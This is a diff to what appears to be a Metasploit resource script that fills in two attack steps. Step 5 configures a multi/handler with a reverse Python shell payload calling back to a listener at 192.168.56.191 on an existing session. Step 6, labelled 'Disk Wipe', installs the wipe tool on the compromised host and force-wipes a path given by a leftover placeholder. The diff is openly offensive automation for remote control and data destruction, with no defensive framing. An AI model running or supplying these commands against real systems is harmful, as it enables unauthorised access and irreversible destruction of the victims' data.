@@ -53,12 +53,20 @@ sessions -k 1, 2, 3
 sleep 15
 
 # ============================================================
-# STEP 5 - 
+# STEP 5 - Multi Handler    
 # ============================================================
 
-
+use exploit/multi/handler
+set payload cmd/unix/reverse_python
+set SESSION 3
+set VERBOSE True
+set LHOST 192.168.56.191
+run
 
 # ============================================================
-# STEP 6 - 
+# STEP 6 - Disk Wipe
 # ============================================================
 
+sessions -c 'apt install wipe -y' -i 3
+sleep 15
+sessions -c "wipe -f {0}/tmp" -i 3
